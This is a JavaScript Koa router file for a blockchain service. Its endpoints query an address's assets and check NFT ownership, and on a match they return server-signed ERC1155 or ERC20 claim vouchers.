const router = require('koa-router')();
const date = require("silly-datetime");
const utils = require('../../routes/tools/utils.js');
const config = require('../../conf/config.js');
const service = require('../service/service')
const sign = require('../../routes/tools/sign');
const db = require('../../routes/model/db.js');

// 查询地址资产
router.get('/assets', async (ctx) => {
	try {
		let address = ctx.query.address
		let assets = await ctx.service.chainlink.totalAssets(address)

		console.log(assets)
		ctx.body = {
			code: 0,
			msg: 'ok',
			data: assets
		}
	} catch (err) {
		ctx.body = { data: null, code: 1, msg: err.message }
	}
})

router.get('/checkNft', async (ctx) => {
	try {
		let address = ctx.query.address
		let id = ctx.query.id
		let resp = await ctx.service.nft.check(address, id)

		if (resp.match) {
			let body = {
				id: id,
				spender: config.eth_account,
				deadline: new Date().getTime() + 100000
			}	
			resp.sign = sign.signERC1155Claim(body)
		}
		ctx.body = {
			code: 0,
			msg: 'ok',
			data: resp
		}
	} catch (err) {
		ctx.body = { data: null, code: 1, msg: err.message }
	}
})

router.get('/checkToken', async (ctx) => {
	try {
		let address = ctx.query.address
		let id = ctx.query.id
		let token = ctx.query.token
		let resp = await ctx.service.nft.check(address, id)

		let item = {
            token: token,
            owner: address,
            spender: config.eth_account,
			match: resp.match
        }
		await db.saveERC20ClaimData(item)

		if (resp.match) {
			let body = {
				token: token,
				owner: address,
				spender: config.eth_account,
				value: '1000000000000000000',
				deadline: new Date().getTime() + 100000
			}
	
			resp.sign = sign.signERC20Claim(body)
		}
		ctx.body = {
			code: 0,
			msg: 'ok',
			data: resp
		}
	} catch (err) {
		ctx.body = { data: null, code: 1, msg: err.message }
	}
})

module.exports = router.routes();